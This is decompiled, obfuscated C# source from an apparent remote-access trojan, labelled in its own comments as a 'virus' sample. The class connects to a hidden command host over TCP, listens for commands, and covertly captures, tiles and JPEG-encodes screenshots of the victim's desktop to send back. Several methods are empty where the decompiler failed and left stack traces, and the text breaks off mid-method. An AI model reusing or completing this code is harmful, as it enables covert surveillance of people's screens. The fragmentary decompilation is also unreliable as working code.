using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class _____________________________
{
	private TcpClient _;

	private bool __;

	private _____________________________.______________________________ ___;

	public StreamWriter ____;

	public StreamReader _____;

	private string ______;

	public string _______;

	private static List<Bitmap> ________;

	private static List<Point> _________;

	private static Bitmap __________;

	private int ___________;

	private int ____________;

	private int _____________;

	private static int ______________;

	private static int _______________;

	private static int ________________;

	static _____________________________()
	{
		_____________________________.________ = new List<Bitmap>();
		_____________________________._________ = new List<Point>();
		_____________________________.__________ = new Bitmap(1, 1);
		_____________________________.______________ = 0;
		_____________________________._______________ = 0;
		_____________________________.________________ = 0;
	}

	public _____________________________()
	{
		this.__ = false;
		this.______ = <Module>._______<string>(363088510);
		this._______ = <Module>._____<string>(-1664248431);
		this.___________ = 5;
		this.____________ = 5;
		this._____________ = 50;
	}

	public void ____(byte[] byte_0)
	{
		// 
		// Current member / type: System.Void _____________________________::____(System.Byte[])
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void ____(System.Byte[])
		// 
		// Intervails are more than in the last iteration.
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 108
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public void _____(string string_0)
	{
		string[] strArrays = null;
		byte[] numArray = null;
		int num = 0;
		int num1 = 0;
		object length;
		try
		{
			if (!string_0.Contains(<Module>.____<string>(-1286171096)))
			{
				goto Label0;
			}
			strArrays = Strings.Split(string_0, <Module>._______<string>(1974200954), -1, CompareMethod.Binary);
			num1 = 18253;
			int ____ = ______________________._______;
			if ((num * 1046723648 - 3578 - 266528 == 4 * (8 * ____ + 8 * ____) ? 1108822575 : -27307) == -27307)
			{
				goto Label1;
			}
		Label3:
			MemoryStream memoryStream = new MemoryStream();
			string str = string.Concat(<Module>.___<string>(1283373911), this._______);
			if (num1 != -17649)
			{
				memoryStream.Write(_____________________________.__________(str), 0, str.Length);
				memoryStream.Write(numArray, 0, checked((int)numArray.Length));
				this.______(memoryStream.ToArray());
				memoryStream.Dispose();
				return;
			}
		Label1:
			this.___________ = Convert.ToInt32(strArrays[1]);
			this.____________ = Convert.ToInt32(strArrays[2]);
			length = Type.EmptyTypes.Length + 1;
		Label4:
			switch (length)
			{
				case 0:
				{
					goto Label3;
				}
				default:
				{
					this._____________ = Convert.ToInt32(strArrays[3]);
					break;
				}
			}
		Label0:
			numArray = _____________________________.___________________(this.___________, this.____________, this._____________);
			num1 = (128385024 * num1 * 8192 - -723517440 != num1 << 25 ? Type.EmptyTypes.Length + -23322 : (int)(sizeof(long) + 1380311903));
			length = sizeof(Guid) + -16;
			goto Label4;
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public void ______(byte[] byte_0)
	{
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			memoryStream.Write(byte_0, 0, checked((int)byte_0.Length));
			memoryStream.Write(_____________________________.__________(this.______), 0, this.______.Length);
			this._.Client.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			this._______();
			ProjectData.ClearProjectError();
		}
	}

	public void _______()
	{
		// 
		// Current member / type: System.Void _____________________________::_______()
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void _______()
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public void ________()
	{
		try
		{
			______________________________________________________________.______________(<Module>.____<string>(-899364305), <Module>._______<string>(-1373601028));
			this._ = new TcpClient(______________________________________________________________._____________, ______________________________________________________________.______________);
			object obj = checked((int)1);
			while (true)
			{
				switch (obj)
				{
					case 0:
					{
						break;
					}
					case 1:
					{
						this._.ReceiveBufferSize = 9999999;
						this._.SendBufferSize = 9999999;
						obj = sizeof(ushort) + -2;
						continue;
					}
					default:
					{
						goto case 1;
					}
				}
			}
			Thread.Sleep(1000);
			string str = string.Concat(<Module>.____<string>(-701541693), ______________________________________________________________.________________________, <Module>.______<string>(861631917));
			this._____________(str);
			_____________________________ _______________ = this;
			(new Thread(new ThreadStart(_______________._________))).Start();
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			______________________________________________________________.______________(<Module>.____<string>(1187660804), string.Concat(<Module>._____<string>(904978708), exception.ToString()));
			this._______();
			ProjectData.ClearProjectError();
		}
	}

	public void _________()
	{
		Array arrays = null;
		object[] objArray;
		MemoryStream memoryStream = new MemoryStream();
		while (true)
		{
			try
			{
				if (this._.Available > 0)
				{
					byte[] numArray = new byte[this._.Available - 1 + 1];
					this._.Client.Receive(numArray, 0, checked((int)numArray.Length), SocketFlags.None);
					object length = Type.EmptyTypes.Length + 2;
					while (true)
					{
						switch (length)
						{
							case 0:
							{
								memoryStream.Dispose();
								memoryStream = new MemoryStream();
								if (arrays.Length != 2)
								{
									goto Label1;
								}
								goto case 1;
							}
							case 1:
							{
								object[] objArray1 = new object[] { 1 };
								byte[] numArray1 = (byte[])NewLateBinding.LateIndexGet(arrays, objArray1, null);
								objArray = new object[] { 1 };
								memoryStream.Write(numArray1, 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet(arrays, objArray, null), null, <Module>.____<string>(527765695), new object[0], null, null, null)));
								Thread.Sleep(1);
								goto case 3;
							}
							case 2:
							{
								memoryStream.Write(numArray, 0, checked((int)numArray.Length));
								length = Type.EmptyTypes.Length + 3;
								continue;
							}
							case 3:
							{
								if (!_____________________________.___________(memoryStream.ToArray()).Contains(<Module>.______<string>(-551622839)))
								{
									goto Label1;
								}
								arrays = _____________________________.____________(memoryStream.ToArray(), <Module>._____<string>(1355333096));
								goto case 4;
							}
							case 4:
							{
								objArray = new object[] { 0 };
								this.____((byte[])NewLateBinding.LateIndexGet(arrays, objArray, null));
								length = sizeof(ulong) + -8;
								continue;
							}
							default:
							{
								goto case 2;
							}
						}
					}
				}
			Label1:
				Thread.Sleep(10);
			}
			catch (Exception exception)
			{
				ProjectData.SetProjectError(exception);
				ProjectData.ClearProjectError();
				break;
			}
		}
	}

	public static byte[] __________(string string_0)
	{
		return Encoding.Default.GetBytes(string_0);
	}

	public static string ___________(byte[] byte_0)
	{
		return Encoding.Default.GetString(byte_0);
	}

	public static Array ____________(byte[] byte_0, string string_0)
	{
		MemoryStream memoryStream = null;
		MemoryStream memoryStream1 = null;
		List<byte[]> numArrays = null;
		string[] strArrays = null;
		int ______ = <Module>.__________;
		if (1008640 + (128 * ______ >> 7) != ______)
		{
			numArrays = new List<byte[]>();
			memoryStream = new MemoryStream();
			memoryStream1 = new MemoryStream();
			strArrays = Strings.Split(_____________________________.___________(byte_0), string_0, -1, CompareMethod.Binary);
			object length = sizeof(ushort) + -1;
			while (true)
			{
				switch (length)
				{
					case 0:
					{
						break;
					}
					case 1:
					{
						memoryStream.Write(byte_0, 0, strArrays[0].Length);
						length = Type.EmptyTypes.Length + 0;
						continue;
					}
					default:
					{
						goto case 1;
					}
				}
			}
		}
		memoryStream1.Write(byte_0, strArrays[0].Length + string_0.Length, checked((int)byte_0.Length) - (strArrays[0].Length + string_0.Length));
		numArrays.Add(memoryStream.ToArray());
		numArrays.Add(memoryStream1.ToArray());
		memoryStream.Dispose();
		memoryStream1.Dispose();
		return numArrays.ToArray();
	}

	public void _____________(string string_0)
	{
		try
		{
			this.____ = new StreamWriter(this._.GetStream());
			this.____.WriteLine(string.Concat(<Module>._______<string>(1020359086), string_0));
			this.____.Flush();
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			this._______();
			ProjectData.ClearProjectError();
		}
	}

	private static Size ______________(int int_0)
	{
		int length = 0;
		int width;
		int num = 0;
		int height;
		string str;
		string str1;
		object obj;
		int length1;
	Label5:
		Rectangle bounds = Screen.PrimaryScreen.Bounds;
		Size size = new Size(bounds.Width, Screen.PrimaryScreen.Bounds.Height);
		int _______ = <Module>.____________;
		if (2051692361 + (_______ / 3462917 >> 24) != (7578 & _______))
		{
			goto Label0;
		}
		obj = Type.EmptyTypes.Length + 1522509316;
	Label6:
		while (true)
		{
			switch (obj)
			{
				case 0:
				{
					size.Height = (int)Math.Round((double)size.Height / 6);
					length == 644;
					width = size.Width;
					str = width.ToString();
					height = size.Width;
					size.Width = Conversions.ToInteger(string.Concat(Strings.Mid(str, 1, height.ToString().Length - 1), Conversions.ToString(0)));
					height = size.Height;
					<Module>.____________ = -1529522494;
					str1 = height.ToString();
					width = size.Height;
					size.Height = Conversions.ToInteger(string.Concat(Strings.Mid(str1, 1, width.ToString().Length - 1), Conversions.ToString(0)));
					return size;
				}
				case 2:
				{
					size.Height = (int)Math.Round((double)size.Height / 4);
					obj = Type.EmptyTypes.Length + 4;
					continue;
				}
				case 3:
				{
					break;
				}
				case 4:
				{
					width = size.Width;
					str = width.ToString();
					height = size.Width;
					size.Width = Conversions.ToInteger(string.Concat(Strings.Mid(str, 1, height.ToString().Length - 1), Conversions.ToString(0)));
					height = size.Height;
					<Module>.____________ = -1529522494;
					str1 = height.ToString();
					width = size.Height;
					size.Height = Conversions.ToInteger(string.Concat(Strings.Mid(str1, 1, width.ToString().Length - 1), Conversions.ToString(0)));
					return size;
				}
				default:
				{
					goto Label0;
				}
			}
		}
		size.Height = (int)Math.Round((double)size.Height / 2);
		if (length != -11066)
		{
			width = size.Width;
			str = width.ToString();
			height = size.Width;
			size.Width = Conversions.ToInteger(string.Concat(Strings.Mid(str, 1, height.ToString().Length - 1), Conversions.ToString(0)));
			height = size.Height;
			<Module>.____________ = -1529522494;
			str1 = height.ToString();
			width = size.Height;
			size.Height = Conversions.ToInteger(string.Concat(Strings.Mid(str1, 1, width.ToString().Length - 1), Conversions.ToString(0)));
			return size;
		}
		size.Height = (int)Math.Round((double)size.Height / 6);
		length == 644;
		width = size.Width;
		str = width.ToString();
		height = size.Width;
		size.Width = Conversions.ToInteger(string.Concat(Strings.Mid(str, 1, height.ToString().Length - 1), Conversions.ToString(0)));
		height = size.Height;
		<Module>.____________ = -1529522494;
		str1 = height.ToString();
		width = size.Height;
		size.Height = Conversions.ToInteger(string.Concat(Strings.Mid(str1, 1, width.ToString().Length - 1), Conversions.ToString(0)));
		return size;
	Label0:
		switch (int_0)
		{
			case 0:
			{
				return size;
			}
			case 3:
			{
				size.Width = (int)Math.Round((double)size.Width / 1.5);
				length = -14467;
				if (-(num & 6354) * 134217728 - -671088640 == num >> 6)
				{
					goto Label5;
				}
				size.Height = (int)Math.Round((double)size.Height / 1.5);
				if (length == -11331)
				{
					break;
				}
				break;
			}
			case 5:
			{
				size.Width = (int)Math.Round((double)size.Width / 2);
				length = Type.EmptyTypes.Length + 3282;
				obj = Type.EmptyTypes.Length + 3;
				goto Label6;
			}
			case 11:
			{
				size.Width = (int)Math.Round((double)size.Width / 4);
				obj = Type.EmptyTypes.Length + 2;
				goto Label6;
			}
			case 13:
			{
				size.Width = (int)Math.Round((double)size.Width / 6);
				if ((length * 67 + length * 445 - 5181 & 357) != 321)
				{
					length1 = Type.EmptyTypes.Length + 1301828542;
				}
				else if ((-9529 ^ _______ / 2) != 0)
				{
					length1 = ((_______ + (_______ & _______ + _______) + (8591 & _______) ^ -1694875233) != 0 ? (int)(sizeof(int) + 640) : Type.EmptyTypes.Length + 1213469206);
				}
				else
				{
					length1 = Type.EmptyTypes.Length + 2043683212;
				}
				length = length1;
				obj = sizeof(float) + -4;
				goto Label6;
			}
		}
		width = size.Width;
		str = width.ToString();
		height = size.Width;
		size.Width = Conversions.ToInteger(string.Concat(Strings.Mid(str, 1, height.ToString().Length - 1), Conversions.ToString(0)));
		height = size.Height;
		<Module>.____________ = -1529522494;
		str1 = height.ToString();
		width = size.Height;
		size.Height = Conversions.ToInteger(string.Concat(Strings.Mid(str1, 1, width.ToString().Length - 1), Conversions.ToString(0)));
		return size;
	}

	private static Image _______________(int int_0 = 0, int int_1 = 0, bool bool_0 = true)
	{
		Size size;
		IntPtr intPtr = default(IntPtr);
		Rectangle bounds;
		Graphics graphic;
		Image thumbnailImage = null;
		Bitmap bitmap;
		try
		{
			Rectangle rectangle = Screen.PrimaryScreen.Bounds;
			int width = rectangle.Width;
			Rectangle bounds1 = Screen.PrimaryScreen.Bounds;
			<Module>.______ = 1386028750;
			rectangle = bounds1;
			switch (sizeof(ushort))
			{
				default:
				{
					bitmap = new Bitmap(width, rectangle.Height);
					graphic = Graphics.FromImage(bitmap);
					graphic.CompositingQuality = CompositingQuality.HighQuality;
					rectangle = Screen.PrimaryScreen.Bounds;
					int num = rectangle.Width;
					bounds = Screen.PrimaryScreen.Bounds;
					size = new Size(num, bounds.Height);
					graphic.CopyFromScreen(0, 0, 0, 0, size, CopyPixelOperation.SourceCopy);
					break;
				}
			}
			if (bool_0)
			{
				try
				{
					Cursor @default = Cursors.Default;
					Point position = Cursor.Position;
					size = new Size(32, 32);
					bounds = new Rectangle(position, size);
					@default.Draw(graphic, bounds);
				}
				catch (Exception exception)
				{
					ProjectData.SetProjectError(exception);
					ProjectData.ClearProjectError();
				}
			}
			graphic.Dispose();
			if (!(int_0 == 0 & int_1 == 0))
			{
				thumbnailImage = bitmap.GetThumbnailImage(int_0, int_1, null, intPtr);
			}
			else
			{
				thumbnailImage = bitmap;
			}
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			ProjectData.ClearProjectError();
		}
		return thumbnailImage;
	}

	private static string ________________(byte[] byte_0)
	{
		byte_0 = (new MD5CryptoServiceProvider()).ComputeHash(byte_0);
		return Convert.ToBase64String(byte_0);
	}

	public static ImageCodecInfo _________________(string string_0)
	{
		// 
		// Current member / type: System.Drawing.Imaging.ImageCodecInfo _____________________________::_________________(System.String)
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Drawing.Imaging.ImageCodecInfo _________________(System.String)
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public static void __________________()
	{
		_____________________________.______________ = -1;
		_____________________________._______________ = -1;
		_____________________________.________________ = -1;
		_____________________________.__________ = new Bitmap(1, 1);
	}

	public static byte[] ___________________(int int_0, int int_1, int int_2)
	{
		unsafe
		{
			int num = 0;
			int length;
			byte[] array = null;
			int width = 0;
			List<Bitmap> bitmaps = null;
			int count = 0;
			Graphics graphic;
			int length1 = 0;
			int height;
			List<int> nums = null;
			int integer = 0;
			int ____ = 0;
			int num1 = 0;
			int int1 = 0;
			MemoryStream memoryStream = null;
			int num2 = 0;
			Size size;
			int num3 = 0;
			int height1 = 0;
			Bitmap bitmap;
			int num4 = 0;
			Bitmap bitmap1 = null;
			int int11 = 0;
			int num5 = 0;
			Point item;
			Bitmap ______ = null;
			int num6 = 0;
			int height2 = 0;
			int num7;
			Rectangle rectangle;
			int current = 0;
			int integer1 = 0;
			List<int>.Enumerator enumerator = new List<int>.Enumerator();
			int height3 = 0;
			int ________ = 0;
			int num8 = 0;
			int _______;
			List<Point> points = null;
			MemoryStream memoryStream1 = null;
			int width1;
			byte[] numArray = null;
			Bitmap bitmap2 = null;
			EncoderParameters encoderParameter;
			object obj;
			int num9;
			int length2;
			try
			{
			Label28:
				size = new Size((Point)_____________________________.______________(int_0));
				height = size.Width;
				string str = height.ToString();
				width1 = size.Width;
				size.Width = Conversions.ToInteger(string.Concat(Strings.Mid(str, 1, width1.ToString().Length - 1), Conversions.ToString(0)));
				length = 17404;
				if ((969 + height2 == -height2 ? -1415668739 : -7052) != -7052)
				{
					goto Label0;
				}
				width1 = size.Height;
				string str1 = width1.ToString();
				height = size.Height;
				size.Height = Conversions.ToInteger(string.Concat(Strings.Mid(str1, 1, height.ToString().Length - 1), Conversions.ToString(0)));
				length = Type.EmptyTypes.Length + 27632;
			Label11:
				if (_____________________________.__________.Size.Width != size.Width | _____________________________.__________.Height != size.Height | _____________________________._______________ != int_1 | _____________________________.________________ != int_2)
				{
					goto Label1;
				}
				if (length == 27538)
				{
					goto Label2;
				}
				_____________________________.________.Clear();
				_____________________________._________.Clear();
				_____________________________.__________ = new Bitmap(size.Width, size.Height);
				obj = Type.EmptyTypes.Length + 0;
				goto Label3;
			}
			catch (Exception exception)
			{
				ProjectData.SetProjectError(exception);
				ProjectData.ClearProjectError();
			}
			return array;
		Label0:
		Label7:
			Bitmap ______1 = _____________________________.__________;
			rectangle = new Rectangle(num6, num, integer, integer1);
			bitmap2 = ______1.Clone(rectangle, ______.PixelFormat);
			obj = Type.EmptyTypes.Length + 6;
		Label3:
			while (true)
			{
				switch (obj)
				{
					case 0:
					{
						goto Label1;
					}
					case 1:
					{
						goto Label4;
					}
					case 2:
					{
						goto Label5;
					}
					case 3:
					{
						goto Label6;
					}
					case 4:
					{
						goto Label7;
					}
					case 5:
					{
						goto Label8;
					}
					case 6:
					{
						bitmap1.Save(memoryStream1, ImageFormat.Jpeg);
						numArray = memoryStream1.ToArray();
						int num10 = ___________._;
						length = ((num10 * 16 ^ num10 << 24) == 5030 ? (int)(sizeof(long) + 1395518895) : Type.EmptyTypes.Length + -24264);
						obj = Type.EmptyTypes.Length + 10;
						continue;
					}
					case 7:
					{
						goto Label9;
					}
					case 8:
					{
						goto Label10;
					}
					case 9:
					{
						goto Label11;
					}
					case 10:
					{
						goto Label12;
					}
					case 11:
					{
						goto Label13;
					}
				}
			}
			goto Label11;
		Label1:
			_____________________________.______________ = int_0;
			_____________________________._______________ = int_1;
			_____________________________.________________ = int_2;
			bitmaps = new List<Bitmap>();
			____ = ______________________._______;
			length = (int)(sizeof(byte) + -26342);
			int ______2 = <Module>.___________;
			if ((______2 / 323590 & 134217728 * ______2 / 268435456) != -2073112277)
			{
				obj = Type.EmptyTypes.Length + 11;
				goto Label3;
			}
			else if ((6720 ^ width1 << 16) - 576863472 == integer1 % 29037696 >> 25)
			{
				obj = Type.EmptyTypes.Length + 1302781776;
				goto Label3;
			}
			else
			{
				obj = sizeof(Guid) + 1876735659;
				goto Label3;
			}
		Label2:
			width = size.Width;
			height1 = size.Height;
			int1 = int_1 - 1;
			num8 = 0;
			obj = Type.EmptyTypes.Length + 1;
			goto Label3;
		Label4:
			if (num8 > int1)
			{
				goto Label14;
			}
			int11 = int_1 - 1;
			num5 = 0;
			length = 15390;
			if (Type.EmptyTypes.Length + 16770 == 16770)
			{
				goto Label15;
			}
		Label27:
			num2++;
		Label42:
			if (num2 > num3 || num2 == bitmaps.Count)
			{
				bitmap = new Bitmap(bitmaps[0].Width, height2);
				graphic = Graphics.FromImage(bitmap);
				height3 = 0;
				string str2 = string.Concat(Conversions.ToString(______.Width), <Module>._____<string>(116858529), Conversions.ToString(______.Height), <Module>.____<string>(-1042697112));
				try
				{
					if ((height2 / 1071270581 | -5041) == -5041)
					{
						goto Label17;
					}
				Label18:
					graphic.DrawImage(bitmaps[current], 0, height3);
					height3 = height3 + bitmaps[current].Height;
				Label22:
					if (enumerator.MoveNext())
					{
						current = enumerator.Current;
						int num11 = -11144;
						if (int1 + -1744830464 == int1)
						{
							goto Label17;
						}
						string[] strArrays = new string[] { str2, null, null, null, null, null, null };
						object obj1 = sizeof(uint) + -1;
						while (true)
						{
							switch (obj1)
							{
								case 0:
								{
									strArrays[2] = <Module>.______<string>(1060962588);
									item = points[current];
									strArrays[3] = Conversions.ToString(item.Y);
									if (____ / 6876 - -2147483648 == (9989 & num % 65536) << 20)
									{
										obj1 = Type.EmptyTypes.Length + -2037812868;
										continue;
									}
									else
									{
										obj1 = Type.EmptyTypes.Length + 1;
										continue;
									}
								}
								case 1:
								{
									strArrays[4] = <Module>._______<string>(1916090129);
									strArrays[5] = Conversions.ToString(bitmaps[current].Height);
									if (31348 + (num8 << 2) == 14444 * num8)
									{
										num9 = (((height & 3944) - -(integer | 6829) & 328384003) == 0 ? -1448105739 : Type.EmptyTypes.Length + 1975909300);
									}
									else
									{
										num9 = -1182;
									}
									num11 = num9;
									obj1 = Type.EmptyTypes.Length + 2;
									continue;
								}
								case 2:
								{
									strArrays[6] = <Module>.___<string>(-231866189);
									str2 = string.Concat(strArrays);
									if (num11 == -1182)
									{
										goto Label18;
									}
									else
									{
										goto case 1;
									}
								}
								case 3:
								{
									Point point = points[current];
									strArrays[1] = Conversions.ToString(point.X);
									obj1 = sizeof(float) + -4;
									continue;
								}
								default:
								{
									goto case 3;
								}
							}
						}
					}
					else
					{
						goto Label19;
					}
				Label17:
					enumerator = nums.GetEnumerator();
					goto Label22;
				}
				finally
				{
					((IDisposable)enumerator).Dispose();
				}
			Label19:
				_______ = <Module>._____________;
				if ((_______ << 20) + -(_______ * 37 + _______ * 91) == 7320)
				{
					goto Label23;
				}
				str2 = string.Concat(str2, <Module>.____<string>(-1308586825));
				count = bitmaps.Count - 1;
				num4 = 0;
				length2 = Type.EmptyTypes.Length + 3;
			Label36:
				switch (length2)
				{
					case 0:
					{
						goto Label24;
					}
					case 1:
					{
						MemoryStream memoryStream2 = new MemoryStream();
						memoryStream2.Write(Encoding.Default.GetBytes(str2), 0, str2.Length);
						memoryStream2.Write(memoryStream.ToArray(), 0, (int)memoryStream.Length);
						_____________________________.__________ = ______;
						bitmap.Dispose();
						array = memoryStream2.ToArray();
						return array;
					}
					case 2:
					{
						goto Label25;
					}
					default:
					{
						goto Label26;
					}
				}
			}
			else
			{
				nums.Add(num2);
